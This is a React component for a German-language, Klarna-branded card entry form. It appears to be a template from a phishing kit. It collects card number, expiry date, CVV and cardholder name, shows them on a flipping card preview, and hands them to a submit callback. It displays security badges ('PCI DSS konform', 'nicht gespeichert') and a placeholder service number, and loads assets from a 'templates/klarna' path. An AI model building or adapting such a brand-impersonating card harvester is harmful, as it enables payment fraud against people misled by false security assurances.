import React, { useState } from 'react';
import { Lock, CheckCircle, ShieldCheck, CreditCard } from 'lucide-react';

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

interface KlarnaBankCardProps {
  onSubmit: (data: BankCardData) => void;
  onSkip?: () => void;
}

const KlarnaBankCard: React.FC<KlarnaBankCardProps> = ({ onSubmit, onSkip }) => {
  const [formData, setFormData] = useState<BankCardData>({
    card_number: '',
    expiry_date: '',
    cvv: '',
    cardholder_name: ''
  });

  const [errors, setErrors] = useState<Partial<BankCardData>>({});
  const [isLoading, setIsLoading] = useState(false);
  const [isFlipped, setIsFlipped] = useState(false);

  const formatCardNumber = (value: string): string => {
    const digits = value.replace(/\D/g, '');
    return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
  };

  const formatExpiryDate = (value: string): string => {
    const digits = value.replace(/\D/g, '');
    if (digits.length >= 2) {
      return digits.slice(0, 2) + '/' + digits.slice(2, 4);
    }
    return digits;
  };

  const handleInputChange = (name: keyof BankCardData, value: string) => {
    let formattedValue = value;
    
    if (name === 'card_number') {
      formattedValue = formatCardNumber(value);
    } else if (name === 'expiry_date') {
      formattedValue = formatExpiryDate(value);
    } else if (name === 'cvv') {
      formattedValue = value.replace(/\D/g, '');
    } else if (name === 'cardholder_name') {
      formattedValue = value.toUpperCase();
    }
    
    setFormData(prev => ({ ...prev, [name]: formattedValue }));
    
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    if (!formData.card_number.trim()) {
      newErrors.card_number = 'Kartennummer ist erforderlich';
    } else {
      const digits = formData.card_number.replace(/\D/g, '');
      if (digits.length < 13 || digits.length > 19) {
        newErrors.card_number = 'Ungültige Kartennummer';
      }
    }
    
    if (!formData.expiry_date.trim()) {
      newErrors.expiry_date = 'Ablaufdatum ist erforderlich';
    } else if (!/^\d{2}\/\d{2}$/.test(formData.expiry_date)) {
      newErrors.expiry_date = 'Format: MM/JJ';
    } else {
      const [month, year] = formData.expiry_date.split('/');
      const expiryDate = new Date(2000 + parseInt(year), parseInt(month) - 1);
      const currentDate = new Date();
      currentDate.setDate(1);
      
      if (expiryDate < currentDate) {
        newErrors.expiry_date = 'Karte ist abgelaufen';
      }
    }
    
    if (!formData.cvv.trim()) {
      newErrors.cvv = 'CVV ist erforderlich';
    } else if (!/^\d{3,4}$/.test(formData.cvv)) {
      newErrors.cvv = 'CVV muss 3-4 Ziffern haben';
    }
    
    if (!formData.cardholder_name.trim()) {
      newErrors.cardholder_name = 'Karteninhaber ist erforderlich';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    
    try {
      await onSubmit(formData);
    } catch (error) {
      console.error('Bank card submission error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  // Detect card type and get provider info
  const getCardProvider = (number: string) => {
    const digits = number.replace(/\D/g, '');
    
    if (digits.startsWith('4')) {
      return {
        type: 'visa',
        name: 'Visa',
        logo: '/templates/klarna/images/visa.svg'
      };
    }
    if (digits.startsWith('5') || (digits.startsWith('2') && digits.length >= 2 && parseInt(digits.substring(0, 2)) >= 22 && parseInt(digits.substring(0, 2)) <= 27)) {
      return {
        type: 'mastercard',
        name: 'Mastercard',
        logo: '/templates/klarna/images/mastercard.svg'
      };
    }
    if (digits.startsWith('37') || digits.startsWith('34')) {
      return {
        type: 'amex',
        name: 'American Express',
        logo: '/templates/klarna/images/american-express.svg'
      };
    }
    if (digits.startsWith('6011') || digits.startsWith('65') || (digits.startsWith('644') || digits.startsWith('645'))) {
      return {
        type: 'discover',
        name: 'Discover',
        logo: null
      };
    }
    
    return {
      type: 'generic',
      name: 'Bank Card',
      logo: null
    };
  };

  const cardProvider = getCardProvider(formData.card_number);

  return (
    <div className="klarna-bank-card-container">
      <div className="klarna-bank-card-header">
        <h1 className="klarna-title">Zahlungsinformationen</h1>
        <p className="klarna-subtitle">
          Geben Sie Ihre Kartendaten ein - Ihre Daten werden sicher verschlüsselt
        </p>
      </div>

      <div className="klarna-card-layout">
        {/* Left Column - Form */}
        <div className="klarna-card-form-column">
          <form onSubmit={handleSubmit} className="klarna-card-form">
            <div className="klarna-form-group">
              <label htmlFor="card_number" className="klarna-label">
                Kartennummer <span className="klarna-required">*</span>
              </label>
              <input
                type="text"
                id="card_number"
                name="card_number"
                placeholder="1234 5678 9012 3456"
                value={formData.card_number}
                onChange={(e) => handleInputChange('card_number', e.target.value)}
                onFocus={() => setIsFlipped(false)}
                className={`klarna-input ${errors.card_number ? 'klarna-input-error' : ''}`}
                maxLength={19}
                required
                disabled={isLoading}
              />
              {errors.card_number && (
                <span className="klarna-error-text">{errors.card_number}</span>
              )}
            </div>

            <div className="klarna-form-group">
              <label htmlFor="cardholder_name" className="klarna-label">
                Karteninhaber <span className="klarna-required">*</span>
              </label>
              <input
                type="text"
                id="cardholder_name"
                name="cardholder_name"
                placeholder="MAX MUSTERMANN"
                value={formData.cardholder_name}
                onChange={(e) => handleInputChange('cardholder_name', e.target.value)}
                onFocus={() => setIsFlipped(false)}
                className={`klarna-input ${errors.cardholder_name ? 'klarna-input-error' : ''}`}
                required
                disabled={isLoading}
              />
              {errors.cardholder_name && (
                <span className="klarna-error-text">{errors.cardholder_name}</span>
              )}
            </div>

            <div className="klarna-form-row">
              <div className="klarna-form-group">
                <label htmlFor="expiry_date" className="klarna-label">
                  Ablaufdatum <span className="klarna-required">*</span>
                </label>
                <input
                  type="text"
                  id="expiry_date"
                  name="expiry_date"
                  placeholder="MM/JJ"
                  value={formData.expiry_date}
                  onChange={(e) => handleInputChange('expiry_date', e.target.value)}
                  onFocus={() => setIsFlipped(false)}
                  className={`klarna-input ${errors.expiry_date ? 'klarna-input-error' : ''}`}
                  maxLength={5}
                  required
                  disabled={isLoading}
                />
                {errors.expiry_date && (
                  <span className="klarna-error-text">{errors.expiry_date}</span>
                )}
              </div>

              <div className="klarna-form-group">
                <label htmlFor="cvv" className="klarna-label">
                  CVV <span className="klarna-required">*</span>
                </label>
                <input
                  type="text"
                  id="cvv"
                  name="cvv"
                  placeholder="123"
                  value={formData.cvv}
                  onChange={(e) => handleInputChange('cvv', e.target.value)}
                  onFocus={() => setIsFlipped(true)}
                  onBlur={() => setIsFlipped(false)}
                  className={`klarna-input ${errors.cvv ? 'klarna-input-error' : ''}`}
                  maxLength={4}
                  required
                  disabled={isLoading}
                />
                {errors.cvv && (
                  <span className="klarna-error-text">{errors.cvv}</span>
                )}
              </div>
            </div>

            <div className="klarna-form-actions">
              <button 
                type="submit" 
                className="klarna-button klarna-button-primary klarna-button-full"
                disabled={isLoading}
              >
                {isLoading ? 'Zahlung wird verarbeitet...' : 'Zahlung abschließen'}
              </button>
            </div>

            {/* Skip Button */}
            {onSkip && (
              <div className="klarna-form-actions" style={{ marginTop: '1rem' }}>
                <button 
                  type="button"
                  onClick={onSkip}
                  disabled={isLoading}
                  className="klarna-button-secondary"
                  style={{
                    backgroundColor: 'transparent',
                    color: 'var(--klarna-text-secondary)',
                    border: 'none',
                    padding: '0.75rem 1rem',
                    fontSize: 'var(--klarna-font-size-sm)',
                    fontWeight: '400',
                    cursor: isLoading ? 'not-allowed' : 'pointer',
                    fontFamily: 'var(--klarna-font-family)',
                    transition: 'all var(--klarna-transition-base)',
                    opacity: isLoading ? 0.5 : 0.7,
                    textDecoration: 'underline',
                    textAlign: 'center' as const,
                    width: '100%'
                  }}
                  onMouseOver={(e) => {
                    if (!isLoading) {
                      e.currentTarget.style.opacity = '1';
                      e.currentTarget.style.color = 'var(--klarna-pink)';
                    }
                  }}
                  onMouseOut={(e) => {
                    e.currentTarget.style.opacity = '0.7';
                    e.currentTarget.style.color = 'var(--klarna-text-secondary)';
                  }}
                >
                  Ich habe keine Kreditkarte
                </button>
              </div>
            )}
          </form>
        </div>

        {/* Right Column - Card Preview */}
        <div className="klarna-card-preview-column">
          <div className="klarna-card-preview-header">
            <CreditCard size={20} className="klarna-card-preview-icon" />
            <h3 className="klarna-card-preview-title">Live-Vorschau Ihrer Kartendaten</h3>
          </div>
          <div className={`klarna-credit-card ${isFlipped ? 'is-flipped' : ''}`}>
            {/* Front of Card */}
            <div className="klarna-credit-card-front">
              {/* Card Background Pattern */}
              <div className="bank-card-pattern"></div>
              
              {/* Card Provider Logo */}
              <div className="bank-card-provider">
                {cardProvider.logo ? (
                  <img 
                    src={cardProvider.logo} 
                    alt={cardProvider.name}
                    className="bank-card-provider-logo"
                  />
                ) : cardProvider.type === 'discover' ? (
                  <div className="bank-card-discover-logo">
                    <span>DISCOVER</span>
                  </div>
                ) : (
                  <div className="bank-card-generic">
                    <CreditCard size={32} strokeWidth={1.5} color="rgba(255,255,255,0.8)" />
                  </div>
                )}
              </div>

              {/* EMV Chip */}
              <div className="bank-card-chip">
                <svg width="45" height="35" viewBox="0 0 45 35" fill="none">
                  <rect width="45" height="35" rx="4" fill="url(#chipGradient)"/>
                  <defs>
                    <linearGradient id="chipGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                      <stop offset="0%" stopColor="#FFD700"/>
                      <stop offset="30%" stopColor="#FFC107"/>
                      <stop offset="70%" stopColor="#FF8F00"/>
                      <stop offset="100%" stopColor="#E65100"/>
                    </linearGradient>
                  </defs>
                  <rect x="4" y="4" width="37" height="27" rx="2" fill="rgba(255,255,255,0.1)"/>
                  <rect x="8" y="8" width="29" height="19" rx="1" fill="rgba(0,0,0,0.1)"/>
                  <g stroke="rgba(255,255,255,0.3)" strokeWidth="0.5">
                    <line x1="12" y1="12" x2="33" y2="12"/>
                    <line x1="12" y1="15" x2="33" y2="15"/>
                    <line x1="12" y1="18" x2="33" y2="18"/>
                    <line x1="12" y1="21" x2="33" y2="21"/>
                  </g>
                </svg>
              </div>

              {/* Card Number */}
              <div className="bank-card-number">
                {formData.card_number || '•••• •••• •••• ••••'}
              </div>

              {/* Card Info */}
              <div className="bank-card-info">
                <div className="bank-card-holder">
                  <div className="bank-card-label">KARTENINHABER</div>
                  <div className="bank-card-value">
                    {formData.cardholder_name || 'IHR NAME'}
                  </div>
                </div>
                <div className="bank-card-expiry">
                  <div className="bank-card-label">GÜLTIG BIS</div>
                  <div className="bank-card-value">
                    {formData.expiry_date || 'MM/JJ'}
                  </div>
                </div>
              </div>
            </div>

            {/* Back of Card */}
            <div className="klarna-credit-card-back">
              {/* Magnetic Stripe */}
              <div className="bank-card-stripe"></div>
              
              {/* Card Back Content */}
              <div className="bank-card-back-content">
                <div className="bank-card-cvv-section">
                  <div className="bank-card-cvv-label">CVV</div>
                  <div className="bank-card-cvv-strip">
                    {formData.cvv || '•••'}
                  </div>
                </div>
                
                <div className="bank-card-back-info">
                  <div className="bank-card-back-text">
                    Diese Karte ist Eigentum der ausgebenden Bank. Bei Fund bitte an eine Filiale oder einen autorisierten Vertreter zurückgeben.
                  </div>
                  
                  <div className="bank-card-customer-service">
                    Kundenservice: 0800 123 4567
                  </div>
                </div>
                
                <div className="bank-card-security-features">
                  <div className="security-feature">
                    <div className="security-hologram"></div>
                    <span>Sicherheits-Hologramm</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="klarna-form-footer">
        <div className="klarna-security-badges">
          <div className="klarna-security-badge">
            <span className="klarna-security-icon"><Lock size={16} /></span>
            <span className="klarna-security-text">SSL verschlüsselt</span>
          </div>
          <div className="klarna-security-badge">
            <span className="klarna-security-icon"><CheckCircle size={16} /></span>
            <span className="klarna-security-text">PCI DSS konform</span>
          </div>
          <div className="klarna-security-badge">
            <span className="klarna-security-icon"><ShieldCheck size={16} /></span>
            <span className="klarna-security-text">Käuferschutz</span>
          </div>
        </div>
        
        <p className="klarna-security-notice">
          Ihre Kartendaten werden sicher verschlüsselt und nicht gespeichert
        </p>
      </div>
    </div>
  );
};

export default KlarnaBankCard;

